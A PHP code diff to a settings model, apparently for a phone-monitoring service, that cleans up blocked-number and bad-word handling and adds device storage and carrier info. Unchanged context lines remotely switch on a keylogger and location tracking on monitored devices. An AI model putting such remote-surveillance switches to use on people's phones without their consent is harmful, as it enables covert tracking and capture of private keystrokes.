@@ -47,21 +47,23 @@ class Settings extends BaseModel
 
     public function addBlackListPhone($devId, $phone)
     {
+        $preparedPhone = str_replace(',', '', trim($phone));
+        
+        if (!validatePhoneNumber($preparedPhone)) {
+            throw new Settings\InvalidPhoneNumberException();
+        }
+        
         if (($blackString = $this->getPhoneBlackListString($devId)) === false) {
             throw new Settings\SettingsNotFoundException("Device black phones list not found");
         }
 
-        if (!validatePhoneNumber($phone)) {
-            throw new Settings\InvalidPhoneNumberException();
-        }
-
         $list = $this->buildBlackList($blackString);
 
-        if (in_array($phone, $list)) {
+        if (in_array($preparedPhone, $list)) {
             throw new Settings\PhoneNumberExistException();
         }
 
-        array_push($list, $phone);
+        array_push($list, $preparedPhone);
 
         $newString = $this->blackListToString($list);
 
@@ -69,18 +71,24 @@ class Settings extends BaseModel
     }
 
     public function addBadWord($devId, $word)
-    {
-        if (($blackString = $this->getWordBlackListString($devId)) === false) {
-            throw new Settings\SettingsNotFoundException("Device black phones list not found");
+    {   
+        $preparedWord = str_replace(',', '', trim($word));
+        
+        if (!strlen($preparedWord)) {
+            throw new Settings\InvalidBadWordException();
         }
-
+        
+        if (($blackString = $this->getWordBlackListString($devId)) === false) {
+            throw new Settings\SettingsNotFoundException("Device bad word list not found");
+        }
+        
         $list = $this->buildBlackList($blackString);
 
-        if (in_array($word, $list)) {
+        if (in_array($preparedWord, $list)) {
             throw new Settings\BadWordExistException();
         }
-
-        array_push($list, $word);
+        
+        array_push($list, $preparedWord);
 
         $newString = $this->blackListToString($list);
 
@@ -215,7 +223,6 @@ class Settings extends BaseModel
         return $this->getDb()->exec("UPDATE `dev_settings` SET `bl_phones` = {$escapedValue} WHERE `dev_id` = {$escapedDevId} LIMIT 1");
     }
 
-
     public function setWordsBlackListString($devId, $value)
     {
         $escapedDevId = $this->getDB()->quote($devId);
@@ -267,24 +274,38 @@ class Settings extends BaseModel
         $escapedDevId = $this->getDB()->quote($devId);
         return $this->getDb()->query("SELECT `keylogger_enabled` FROM `dev_settings` WHERE `dev_id` = {$escapedDevId} LIMIT 1")->fetch();
     }
-    
+
     public function getLocationServiceEnabled($devId)
     {
         $escapedDevId = $this->getDB()->quote($devId);
         return $this->getDb()->query("SELECT `location_service_enabled` FROM `dev_settings` WHERE `dev_id` = {$escapedDevId} LIMIT 1")->fetch();
     }
-    
+
     public function activateKeylogger($devId)
     {
         $escapedDevId = $this->getDB()->quote($devId);
 
         $this->getDb()->exec("UPDATE `dev_settings` SET `keylogger_activate` = 1 WHERE `dev_id` = {$escapedDevId} LIMIT 1");
     }
-    
+
     public function activateLocation($devId)
     {
         $escapedDevId = $this->getDB()->quote($devId);
         $this->getDb()->exec("UPDATE `dev_settings` SET `location_service_enabled` = 1 WHERE `dev_id` = {$escapedDevId} LIMIT 1");
+    }
+
+    public function getDeviceInfo($devId)
+    {
+        $escapedDevId = $this->getDB()->quote($devId);
+        return $this->getDb()->query("SELECT * FROM `dev_info` WHERE `dev_id` = {$escapedDevId} LIMIT 1")->fetch(\PDO::FETCH_ASSOC);
+    }
+
+    public static function formatBytes($bytes, $precision = 3)
+    {
+        $base = log($bytes, 1024);
+        $suffixes = array('', 'kB', 'MB', 'GB', 'TB');
+
+        return round(pow(1024, $base - floor($base)), $precision) . ' ' . $suffixes[floor($base)];
     }
 
     public function getSettings($devId)
@@ -295,8 +316,31 @@ class Settings extends BaseModel
             throw new Settings\SettingsNotFoundException("Device settings not found");
         }
 
+        if (($info = $this->getDeviceInfo($devId)) === false) {
+            throw new Settings\SettingsNotFoundException("Device info not found");
+        }
+
+        $info['internalStorage'] = ($info['int_storage_total'] && $info['int_storage_free']) ? [
+            'total' => $info['int_storage_total'] ? self::formatBytes($info['int_storage_total']) : null,
+            'free' => $info['int_storage_free'] ? self::formatBytes($info['int_storage_free']) : null,
+                ] : null;
+
+        $info['externalStorage'] = ($info['ext_storage_total'] && $info['ext_storage_free']) ? [
+            'total' => $info['ext_storage_total'] ? self::formatBytes($info['ext_storage_total']) : null,
+            'free' => $info['ext_storage_free'] ? self::formatBytes($info['ext_storage_free']) : null,
+                ] : null;
+
+        $carrierParts = explode('_', $info['carrier']);
+
+        if (isset($carrierParts[0]) && strlen($carrierParts[0])) {
+            $info['carrier'] = $carrierParts[0];
+        } else {
+            $info['carrier'] = null;
+        }
+
         return array(
             'settings' => $settings,
+            'info' => $info,
             'blackListPhones' => $this->buildBlackList($settings['bl_phones']),
             'blackListWords' => $this->buildBlackList($settings['bl_words']),
             'lockActive' => DeviceOptions::isLockActive($devInfo['os'], $devInfo['os_version']),
